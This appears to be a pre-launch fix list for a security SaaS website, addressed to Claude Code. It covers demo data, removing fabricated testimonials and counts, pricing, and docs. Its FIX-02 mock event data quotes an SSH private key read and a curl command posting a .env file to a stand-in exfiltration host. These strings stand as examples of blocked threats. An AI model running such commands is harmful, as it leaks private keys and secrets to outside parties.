# OpenSyber — Pre-Launch Fix List
> Feed this file to Claude Code. Work through each section in priority order.
> Each fix includes context, exact location hints, and acceptance criteria.

---

## PRIORITY 1 — CRITICAL (must fix before launch)

---

### FIX-01 · Demo page: security score stuck at 0

**Problem**
The live demo at `/demo` shows "Security Score: 0 / Scanning..." indefinitely.
The homepage hero shows 87/100. Visitors click "See Live Demo" and see a broken
zero — the worst possible first impression for a security product.

**What to do**
The demo uses simulated/mock data. Make the score animate from 0 → 87 on page load.
It should resolve within 2–3 seconds to feel realistic (not instant).

```
- Locate the demo page component (likely pages/demo.tsx or app/demo/page.tsx)
- Find where score state is initialized (probably useState(0) or similar)
- Add a useEffect that simulates score calculation:
  - Start at 0
  - Increment every 80ms up to 87
  - Update status from "Scanning..." → "Needs Attention" once resolved
- The score breakdown metrics (Gateway 100, Credential 95, etc.) are already
  rendering correctly — just the top-level score needs this fix
```

**Acceptance criteria**
- [ ] Page loads → score animates 0 → 87 within ~3 seconds
- [ ] Status label changes from "Scanning..." to "Needs Attention" after score resolves
- [ ] "Updated Scanning..." changes to a real timestamp (e.g. "Updated just now")

---

### FIX-02 · Demo page: Recent Security Events is empty

**Problem**
The "Recent Security Events" section renders with no events. This is the most
important thing to demo — it shows the product's core value (catching threats
in real time) and it's completely blank.

**What to do**
Populate with realistic simulated events matching the homepage examples.

```
- Add a mock events array to the demo page data/state
- Events should appear sequentially with a staggered delay (feels live)
- Use these exact events (they match what's shown on the homepage hero):

const mockEvents = [
  {
    id: 1,
    severity: "CRITICAL",
    message: "Credential access blocked — SSH key read attempt",
    detail: "agent tried: cat ~/.ssh/id_rsa",
    time: "2m ago",
    resolved: true
  },
  {
    id: 2,
    severity: "ALERT",
    message: "Exfiltration attempt detected → PagerDuty notified",
    detail: "curl -s https://exfil.bad/collect -d @.env",
    time: "14m ago",
    resolved: true
  },
  {
    id: 3,
    severity: "INFO",
    message: "Skill audit passed — v1.2.0",
    detail: "secret-scanner@1.2.0 verified clean",
    time: "15m ago",
    resolved: true
  },
  {
    id: 4,
    severity: "WARN",
    message: "Supply chain flag — suspicious postinstall script",
    detail: "npm install totally-legit-pkg@latest",
    time: "1h ago",
    resolved: true
  },
  {
    id: 5,
    severity: "OK",
    message: "Agent heartbeat restored",
    detail: "demo-agent-01 reconnected after 2s gap",
    time: "1h ago",
    resolved: true
  }
]

- Render events with appropriate color coding:
  CRITICAL → red badge
  ALERT → orange/amber badge  
  WARN → yellow badge
  INFO → blue badge
  OK → green badge

- The "Events (24h): 0" counter in Instance Status should update to match
  the count of events shown (e.g. 5 or 12 — pick a realistic number)
```

**Acceptance criteria**
- [ ] At least 5 events visible in the Recent Security Events section
- [ ] Events have correct severity color coding
- [ ] Events (24h) counter is non-zero
- [ ] Events appear with a stagger (not all at once)

---

### FIX-03 · Remove fake testimonials

**Problem**
Homepage has three testimonials from "Sarah Chen, CISO TechCorp", "Marcus Williams,
VP Security FinanceHub", and "Elena Rodriguez, Cloud Platform Lead DevOps Plus".
These are clearly placeholder names. Security buyers will immediately recognize
fabricated social proof and it destroys trust in everything else on the page.

**What to do**
Option A (recommended): Remove the testimonials section entirely. Replace with
a simple early-access CTA block.

```
Replace testimonials section with:

<section>
  <h2>Join the early access program</h2>
  <p>
    OpenSyber is in early access. Be among the first teams to secure 
    your AI agent infrastructure.
  </p>
  <a href="/sign-up">Get early access — free forever</a>
</section>
```

Option B: Replace with beta user quotes IF you have real ones. Even a quote
from a developer friend with their real name and GitHub handle is more credible
than a fake CISO.

**Acceptance criteria**
- [ ] No testimonials with fictional names/companies remain on the page
- [ ] The section is either removed or replaced with real quotes

---

### FIX-04 · Remove fabricated review counts and install numbers

**Problem**
The marketplace shows:
- Secret Scanner: (312) reviews, 4,824 installs
- Slack Security Alerts: (289) reviews, 4,102 installs
- Dependency Auditor: (248) reviews, 3,655 installs
- (and so on for all 15 skills)

This is a pre-launch product. These numbers are impossible and sophisticated
users will know it.

**What to do**
```
Option A (recommended before launch):
- Hide review count and install count entirely from skill cards
- Show only: skill name, category, version, "Verified" badge, description
- Add a "Be the first to review" link placeholder for post-launch

Option B:
- Show counts as 0 and "No reviews yet"
- Add a "Beta" or "Early Access" label to all skills

Do NOT just reduce the numbers to something smaller — any non-zero count
before launch looks fabricated.
```

**Find in codebase:**
- Marketplace page component (pages/marketplace or app/marketplace)
- Skill card component — look for where reviewCount / installCount / downloads
  are rendered and conditionally hide them

**Acceptance criteria**
- [ ] No install counts visible on marketplace skill cards
- [ ] No review counts visible on marketplace skill cards
- [ ] "Verified" badge remains (that's a real platform claim, keep it)

---

### FIX-05 · Threats page: live feed shows no data

**Problem**
`/threats` page loads with "LIVE — Real-time security events across the OpenSyber
network. Data refreshes every 15 seconds." but renders no data below the header.

**What to do**
Similar to the demo fix — use simulated/rotating data until real network data exists.

```
- Create a mock threat feed with 8-10 rotating events
- Events should represent different threat types across fictional orgs:

const mockThreats = [
  { type: "CREDENTIAL", severity: "HIGH", region: "EU-West", time: "12s ago", blocked: true },
  { type: "SUPPLY_CHAIN", severity: "CRITICAL", region: "US-East", time: "34s ago", blocked: true },
  { type: "EXFILTRATION", severity: "HIGH", region: "AP-Southeast", time: "1m ago", blocked: true },
  { type: "PROMPT_INJECTION", severity: "MEDIUM", region: "EU-Central", time: "2m ago", blocked: false },
  { type: "TYPOSQUAT_PKG", severity: "HIGH", region: "US-West", time: "3m ago", blocked: true },
  // ... add more
]

- Rotate in a new "event" every 15 seconds (matches the stated refresh cadence)
- Show a counter: "X threats blocked in the last 24h" using a running total
- Include a world map or simple regional breakdown if design supports it

- If real threat data pipeline doesn't exist yet, add a small disclaimer:
  "Events shown are simulated for demonstration. Live data available after signup."
```

**Acceptance criteria**
- [ ] Threats page shows at least 8 events on load
- [ ] New events appear every ~15 seconds
- [ ] Severity color coding matches the rest of the site

---

## PRIORITY 2 — WARNINGS (fix within first week of launch)

---

### FIX-06 · Stat bar: "39 Integrations" is unverified

**Problem**
Homepage shows "39 Integrations" as a stat but there is no integrations page
and only 15 skills in the marketplace.

**What to do**
```
Option A: Reduce to "15+ Skills" and remove the integrations stat until you
have a dedicated integrations page.

Option B: Build a lightweight /integrations page listing all 39 integration
points (SIEM tools, IDEs, alert channels, cloud providers, etc.) so the claim
is verifiable.

Current verifiable stats from the site:
- 15 verified skills ✓ (matches marketplace)
- 7 compliance frameworks ✓ (SOC2, ISO27001, HIPAA, GDPR, EU AI Act + 2 more)
- <60s deploy time ✓ (stated multiple times)
- 39 integrations ✗ (no supporting page)
```

**Acceptance criteria**
- [ ] Either the integrations stat is removed, or /integrations page exists

---

### FIX-07 · Individual skill pages — verify no 404s

**Problem**
The marketplace links to individual skill detail pages (e.g. /marketplace/secret-scanner).
These may not exist or may be stubs.

**What to do**
```
- Visit each of the 15 skill URLs manually
- For any that 404 or show placeholder content, create the page with:
  - Full description (expand on what's in the card)
  - Installation instructions
  - Configuration options / required env vars
  - Example output / screenshots
  - Version history
  - "Install" CTA button

Priority order for skill pages (by install count):
1. /marketplace/secret-scanner
2. /marketplace/slack-security-alerts
3. /marketplace/dependency-auditor
4. /marketplace/git-guardian
5. /marketplace/supply-chain-guard
(rest can follow)
```

**Acceptance criteria**
- [ ] All 15 skill URLs return 200 with real content
- [ ] Each page has install instructions

---

### FIX-08 · Add annual billing option to pricing

**Problem**
No annual billing discount is offered. This is standard SaaS practice and
directly improves revenue and reduces churn.

**What to do**
```
Add a monthly/annual toggle to the pricing page:
- Annual pricing = monthly × 10 (2 months free, ~17% discount)
- Show the per-month equivalent with "billed annually" label
- Highlight savings: "Save $298/yr" on Pro tier etc.

Suggested annual prices:
- Personal: $490/yr ($40.83/mo) vs $49/mo
- Pro: $1,490/yr ($124.17/mo) vs $149/mo  
- Team: $3,990/yr ($332.50/mo) vs $399/mo
```

**Acceptance criteria**
- [ ] Monthly/Annual toggle exists on pricing page
- [ ] Annual prices shown with savings callout

---

### FIX-09 · Add SOC2 timeline to compliance claims

**Problem**
Homepage badge says "SOC2 in progress" which is honest but vague. Enterprise
buyers need to know when to expect it to plan procurement.

**What to do**
```
Change badge or add a tooltip/footnote:
"SOC2 Type I in progress — expected Q3 2026"

Also consider adding a /security page (separate from /security policy) that covers:
- Current security posture
- Pen test status
- Bug bounty program (even a simple responsible disclosure policy)
- SOC2 roadmap
- Data residency details
```

**Acceptance criteria**
- [ ] SOC2 timeline visible somewhere on the site (badge, footer note, or /security page)

---

### FIX-10 · Verify legal pages are complete

**Problem**
Privacy Policy, Terms of Service, and Security Policy are linked in footer
but may contain template placeholders.

**What to do**
```
Search each document for:
- "[PLACEHOLDER]", "[INSERT]", "[DATE]", "[COMPANY]", "[YOUR NAME]"
- Any obviously unfinished sections
- Missing effective date

Critical items that must be in Privacy Policy for GDPR compliance:
- Lawful basis for processing
- Data retention periods  
- Data subject rights (access, deletion, portability)
- DPA availability for B2B customers
- Contact address for privacy requests
- Cookie policy / consent mechanism

Critical items for Terms of Service:
- Limitation of liability
- Acceptable use policy
- Subscription cancellation terms
- SLA / uptime guarantees (or explicit absence thereof)
```

**Acceptance criteria**
- [ ] No placeholder text in any legal document
- [ ] Effective dates set on all documents
- [ ] GDPR lawful basis documented in Privacy Policy

---

### FIX-11 · Verify docs pages have real content

**What to check**
```
Visit each doc URL and verify it has real, complete content:

/docs/getting-started  — must have step-by-step with code snippets
/docs/agent           — architecture diagram + explanation
/docs/skills          — how to build and publish a skill
/docs/security        — scoring methodology, event types, alert config
/docs/api             — ALL endpoints with:
                         - Method + path
                         - Auth header format
                         - Request body schema
                         - Response schema
                         - curl example
                         - Error codes
/docs/faq             — at least 10 real questions

For /docs/api specifically, minimum endpoints to document:
- POST /agents — create agent
- GET /agents/:id — get agent status
- GET /agents/:id/events — get security events
- POST /agents/:id/skills — install skill
- DELETE /agents/:id/skills/:skillId — remove skill
- GET /agents/:id/score — get security score
```

**Acceptance criteria**
- [ ] All 7 doc pages have real content (no stubs)
- [ ] API reference has curl examples for each endpoint
- [ ] Getting Started can be followed by a new user without prior knowledge

---

### FIX-12 · Verify blog posts have full content

**What to check**
```
Visit each of the 8 blog post URLs:
/blog/secure-ai-coding-agents
/blog/ai-agent-kill-chain
/blog/slopsquatting-npm-attacks
/blog/eu-ai-act-compliance-for-agent-platforms
/blog/mcp-security-best-practices
/blog/supply-chain-attacks-targeting-ai-agents
/blog/why-self-hosted-ai-agents-are-a-security-risk
/blog/introducing-opensyber

Check each for:
- Full article content (not truncated or stub)
- Author name (real or "OpenSyber Team" is fine)
- Published date
- Estimated read time
- Meta description (for SEO)
- Open Graph tags (og:title, og:description, og:image) for social sharing
```

**Acceptance criteria**
- [ ] All 8 blog posts load with full content
- [ ] Each has OG tags for clean social sharing

---

## PRIORITY 3 — NICE TO HAVE (post-launch)

---

### FIX-13 · Pro plan: increase agent count

```
$149/mo for 1 agent is steep for individual devs who run multiple
IDE instances. Consider:
- Pro: 3 agents (same price)
- Or: add-on pricing "$30/mo per additional agent"
```

---

### FIX-14 · MSP-specific pricing tier

```
The Team tier ($399/mo, 5 instances) is positioned for MSPs but
MSPs typically need per-tenant/per-client pricing. Consider:
- MSP tier: $X per managed agent instance with volume discounts
- White-label option (resell to clients)
- Separate /msp landing page explaining the use case
```

---

### FIX-15 · Trust page per org

```
The homepage mentions "every OpenSyber instance gets a public trust page"
at opensyber.cloud/trust/your-org. Verify:
- This route exists and generates dynamically
- The embedded badge snippet is copy-pasteable
- The trust page shows real security score data
```

---

## SUMMARY CHECKLIST

| # | Fix | Priority | Effort |
|---|-----|----------|--------|
| 01 | Demo score animates to 87 | 🔴 Critical | Low |
| 02 | Demo events populate | 🔴 Critical | Low |
| 03 | Remove fake testimonials | 🔴 Critical | Low |
| 04 | Remove fake review/install counts | 🔴 Critical | Low |
| 05 | Threats page shows data | 🔴 Critical | Low |
| 06 | Fix or remove "39 integrations" stat | 🟡 Warning | Low |
| 07 | Verify 15 skill pages load | 🟡 Warning | Medium |
| 08 | Add annual billing toggle | 🟡 Warning | Medium |
| 09 | Add SOC2 timeline | 🟡 Warning | Low |
| 10 | Verify legal pages complete | 🟡 Warning | Medium |
| 11 | Verify docs have real content | 🟡 Warning | High |
| 12 | Verify blog posts load fully | 🟡 Warning | Low |
| 13 | Pro plan agent count | 🔵 Nice to have | Low |
| 14 | MSP pricing tier | 🔵 Nice to have | Medium |
| 15 | Trust page per org | 🔵 Nice to have | Medium |

**Estimated time to production-ready: 1–2 focused days on Priority 1+2**

---

*Generated from external audit of opensyber.cloud — March 2026*
